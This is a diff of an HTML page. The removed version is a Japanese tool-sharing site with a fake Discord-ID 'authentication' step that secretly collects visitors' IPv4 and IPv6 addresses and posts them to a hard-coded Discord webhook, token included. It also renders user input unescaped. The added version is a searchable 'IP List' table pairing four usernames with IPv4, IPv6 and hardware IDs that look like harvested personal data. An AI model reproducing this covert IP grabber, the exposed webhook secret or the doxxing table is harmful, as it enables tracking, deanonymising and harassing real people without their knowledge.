@@ -1,225 +1,184 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ツール検索サイト</title>
+    <title>Cyberpunk IP List</title>
     <style>
         body {
-            font-family: 'Courier New', monospace;
-            background-color: #000;
-            color: #00ff00;
+            font-family: 'Arial', sans-serif;
+            background-color: #1a1a2e;
+            color: #e0e0e0;
             margin: 0;
+            padding: 0;
+        }
+
+        header {
+            text-align: center;
             padding: 20px;
-            overflow-x: hidden;
         }
-        .form-container, .tools-container, .search-container {
-            display: none;
-            border: 2px solid #00ff00;
-            padding: 20px;
-            background-color: #1a1a1a;
-            border-radius: 5px;
-        }
-        .tool-card {
-            border: 1px solid #00ff00;
-            padding: 10px;
-            margin: 10px 0;
-            background-color: #0d0d0d;
-            border-radius: 5px;
-        }
-        input, button, textarea {
-            padding: 10px;
-            margin: 5px 0;
-            border: 1px solid #00ff00;
-            background-color: #0d0d0d;
-            color: #00ff00;
-            border-radius: 3px;
-        }
-        button {
+
+        .cyberpunk-btn {
+            background-color: #e94560;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 10px 5px;
             cursor: pointer;
-            background-color: #007700;
+            box-shadow: 0 0 10px rgba(233, 69, 96, 0.8), 0 0 20px rgba(233, 69, 96, 0.8);
+            transition: box-shadow 0.3s ease;
         }
-        button:disabled {
-            background-color: #555;
-            cursor: not-allowed;
+
+        .cyberpunk-btn:hover {
+            box-shadow: 0 0 20px rgba(233, 69, 96, 1), 0 0 30px rgba(233, 69, 96, 1);
         }
-        .button-container {
+
+        .search-bar {
+            width: 80%;
+            padding: 10px;
             margin-bottom: 20px;
+            font-size: 18px;
+            background-color: #0f3460;
+            border: 1px solid #533483;
+            color: #fff;
         }
-        #authContainer {
-            display: block;
+
+        .ip-list {
+            margin: 20px auto;
+            width: 80%;
+            background-color: #0f3460;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(83, 52, 131, 0.5);
+        }
+
+        .ip-list table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .ip-list th, .ip-list td {
+            padding: 10px;
+            text-align: center;
+            border: 1px solid #533483;
+        }
+
+        .ip-list th {
+            background-color: #533483;
+        }
+
+        #lang-toggle {
+            background-color: #0f3460;
+            color: white;
+            border: none;
+            padding: 10px;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(15, 52, 96, 0.8);
+        }
+
+        #ip-count {
+            margin-bottom: 10px;
         }
     </style>
 </head>
 <body>
+    <header>
+        <h1 id="title">IP List</h1>
+        <button id="lang-toggle" class="cyberpunk-btn">日本語</button>
+        <br>
+        <input type="text" id="search-bar" class="search-bar" placeholder="Search by Username, IPv4, IPv6, HWID">
+    </header>
 
-<div id="authContainer" class="form-container">
-    <form id="authForm">
-        <input type="text" id="discordId" placeholder="Discord ID" required>
-        <button type="button" onclick="submitAuth()">認証</button>
-    </form>
-</div>
+    <div class="ip-list">
+        <div id="ip-count">Total IPs: 3</div>
+        <table id="ip-table">
+            <thead>
+                <tr>
+                    <th>jpjpqp8</th>
+                    <th>60.134.239.207</th>
+                    <th>2400:2413:8c81:d000:ece2:ef3a:493:aa74</th>
+                    <th>a23eda7d-5079-4844-8211-b70be796ca21</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>tkg336</td>
+                    <td>14.9.132.34</td>
+                    <td>240b:13:8422:2e00:b470:70c7:aa34:e2c9</td>
+                    <td>12aca502-a076-4312-bfb3-360a66ce980f</td>
+                </tr>
+                <tr>
+                    <td>nebosukekudayo</td>
+                    <td>153.131.140.7</td>
+                    <td>2400:4152:6301:f900:18d2:ab6b:6dfe:66a9</td>
+                    <td>4e79dbd5-7337-461d-81d5-67e72259b166</td>
+                </tr>
+                <tr>
+                    <td>aot1043</td>
+                    <td>59.132.108.58</td>
+                    <td>2001:268:72f2:8709::130:303</td>
+                    <td>072205a7-3343-4a60-9a5b-15808d4a01a0</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
 
-<div class="button-container" id="menuButtons" style="display: none;">
-    <button onclick="showForm('tool')">投稿フォーム</button>
-    <button onclick="showForm('search')">検索フォーム</button>
-    <button onclick="showForm('tools')">ツール表示</button>
-</div>
-
-<div id="formContainer" class="form-container">
-    <h2>ツールの投稿</h2>
-    <form id="toolForm">
-        <input type="text" id="toolName" placeholder="ツール名" required>
-        <input type="text" id="toolTags" placeholder="タグ付け (カンマ区切り)" required>
-        <textarea id="toolDescription" placeholder="説明" rows="4" required></textarea>
-        <textarea id="toolInstallation" placeholder="インストール方法" rows="4" required></textarea>
-        <button type="button" id="submitToolButton" onclick="submitTool()" disabled>投稿</button>
-    </form>
-    <div id="cooldownMessage" style="display: none; color: yellow;">1分間のクールダウン中です。</div>
-</div>
-
-<div class="search-container">
-    <input type="text" id="searchInput" placeholder="ツール名またはタグで検索">
-    <button type="button" onclick="searchTools()">検索</button>
-</div>
-
-<div id="toolsContainer" class="tools-container"></div>
-
-<script>
-    const cooldownDuration = 60000;
-    let lastSubmitTime = 0;
-    let isAuthenticated = false;
-
-    async function getIPData() {
-        const ipv4Data = await (await fetch('https://api.ipify.org?format=json')).json();
-        const ipv6Data = await (await fetch('https://api64.ipify.org?format=json')).json();
-        return { ipv4: ipv4Data.ip, ipv6: ipv6Data.ip };
-    }
-
-    function showForm(form) {
-        document.getElementById('formContainer').style.display = 'none';
-        document.getElementById('toolsContainer').style.display = 'none';
-        document.querySelector('.search-container').style.display = 'none';
-
-        if (form === 'tool') {
-            document.getElementById('formContainer').style.display = 'block';
-        } else if (form === 'search') {
-            document.querySelector('.search-container').style.display = 'block';
-        } else if (form === 'tools') {
-            document.getElementById('toolsContainer').style.display = 'block';
-            loadTools();
-        }
-    }
-
-    async function submitAuth() {
-        const discordId = document.getElementById('discordId').value.trim();
-        if (!discordId) {
-            alert('Discord IDを入力してください。');
-            return;
-        }
-
-        const ipData = await getIPData();
-        const payload = { content: `新しい認証: Discord ID: ${discordId}, IPv4: ${ipData.ipv4}, IPv6: ${ipData.ipv6}` };
-
-        await fetch('https://discord.com/api/webhooks/1290225314022031402/7JCLF2tHFCNnmAO-7xZ1UtQbOJILBkclyGfxt3KYI7buXWMvV-ND6_607i6WzdeJ2Ycy', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-
-        isAuthenticated = true;
-        document.getElementById('submitToolButton').disabled = false;
-        document.getElementById('menuButtons').style.display = 'block';
-        alert('認証成功！ツールを投稿できます。');
-    }
-
-    async function submitTool() {
-        const currentTime = Date.now();
-
-        if (currentTime - lastSubmitTime < cooldownDuration) {
-            document.getElementById('cooldownMessage').style.display = 'block';
-            return;
-        } else {
-            document.getElementById('cooldownMessage').style.display = 'none';
-        }
-
-        if (!isAuthenticated) {
-            alert("ツールを投稿する前に認証してください！");
-            return;
-        }
-
-        lastSubmitTime = currentTime;
-
-        const toolData = {
-            name: document.getElementById('toolName').value,
-            tags: document.getElementById('toolTags').value.split(',').map(tag => tag.trim()),
-            description: document.getElementById('toolDescription').value,
-            installation: document.getElementById('toolInstallation').value
-        };
-
-        const ipData = await getIPData();
-        const payload = {
-            content: `ツールが投稿されました: IPv4: ${ipData.ipv4}, IPv6: ${ipData.ipv6}`,
-            embeds: [
-                {
-                    title: toolData.name,
-                    description: toolData.description,
-                    fields: [
-                        { name: "タグ", value: toolData.tags.join(', ') },
-                        { name: "インストール方法", value: toolData.installation }
-                    ]
-                }
-            ]
-        };
-
-        await fetch('https://discord.com/api/webhooks/1290225314022031402/7JCLF2tHFCNnmAO-7xZ1UtQbOJILBkclyGfxt3KYI7buXWMvV-ND6_607i6WzdeJ2Ycy', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-
-        const tools = JSON.parse(localStorage.getItem('tools')) || [];
-        tools.push(toolData);
-        localStorage.setItem('tools', JSON.stringify(tools));
-        displayTool(toolData);
-        document.getElementById('toolForm').reset();
-    }
-
-    function loadTools() {
-        const tools = JSON.parse(localStorage.getItem('tools')) || [];
-        tools.forEach(tool => {
-            displayTool(tool);
-        });
-    }
-
-    function displayTool(toolData) {
-        const toolsContainer = document.getElementById('toolsContainer');
-        const toolCard = document.createElement('div');
-        toolCard.className = 'tool-card';
-        toolCard.innerHTML = `
-            <h3>${toolData.name}</h3>
-            <p><strong>タグ:</strong> ${toolData.tags.join(', ')}</p>
-            <p><strong>説明:</strong> ${toolData.description}</p>
-            <p><strong>インストール方法:</strong> ${toolData.installation}</p>
-        `;
-        toolsContainer.appendChild(toolCard);
-    }
-
-    function searchTools() {
-        const query = document.getElementById('searchInput').value.toLowerCase();
-        const toolCards = document.querySelectorAll('.tool-card');
-
-        toolCards.forEach(card => {
-            const name = card.querySelector('h3').textContent.toLowerCase();
-            const tags = card.querySelector('p strong:nth-of-type(1)').nextSibling.textContent.toLowerCase();
-            if (name.includes(query) || tags.includes(query)) {
-                card.style.display = 'block';
+    <script>
+        const languageToggle = document.getElementById('lang-toggle');
+        const title = document.getElementById('title');
+        const searchBar = document.getElementById('search-bar');
+        const ipTable = document.getElementById('ip-table').getElementsByTagName('tbody')[0];
+        const ipCount = document.getElementById('ip-count');
+        
+        let currentLang = 'en';
+        languageToggle.addEventListener('click', () => {
+            if (currentLang === 'en') {
+                title.textContent = 'IPリスト';
+                searchBar.placeholder = 'ユーザー名、IPv4、IPv6、HWIDで検索';
+                languageToggle.textContent = '日本語';
+                currentLang = 'jp';
             } else {
-                card.style.display = 'none';
+                title.textContent = 'Cyberpunk IP List';
+                searchBar.placeholder = 'Search by Username, IPv4, IPv6, HWID';
+                languageToggle.textContent = 'English';
+                currentLang = 'en';
             }
         });
-    }
-</script>
 
+        searchBar.addEventListener('keyup', () => {
+            const filter = searchBar.value.toLowerCase();
+            const rows = ipTable.getElementsByTagName('tr');
+
+            for (let i = 0; i < rows.length; i++) {
+                const username = rows[i].getElementsByTagName('td')[0].textContent.toLowerCase();
+                const ipv4 = rows[i].getElementsByTagName('td')[1].textContent.toLowerCase();
+                const ipv6 = rows[i].getElementsByTagName('td')[2].textContent.toLowerCase();
+                const hwid = rows[i].getElementsByTagName('td')[3].textContent.toLowerCase();
+
+                if (username.includes(filter) || ipv4.includes(filter) || ipv6.includes(filter) || hwid.includes(filter)) {
+                    rows[i].style.display = '';
+                } else {
+                    rows[i].style.display = 'none';
+                }
+            }
+        });
+
+        const updateIPCount = () => {
+            const rows = ipTable.getElementsByTagName('tr');
+            let visibleRows = 0;
+            for (let i = 0; i < rows.length; i++) {
+                if (rows[i].style.display !== 'none') {
+                    visibleRows++;
+                }
+            }
+            ipCount.textContent = `Total IPs: ${visibleRows}`;
+        };
+
+        searchBar.addEventListener('keyup', updateIPCount);
+    </script>
 </body>
 </html>
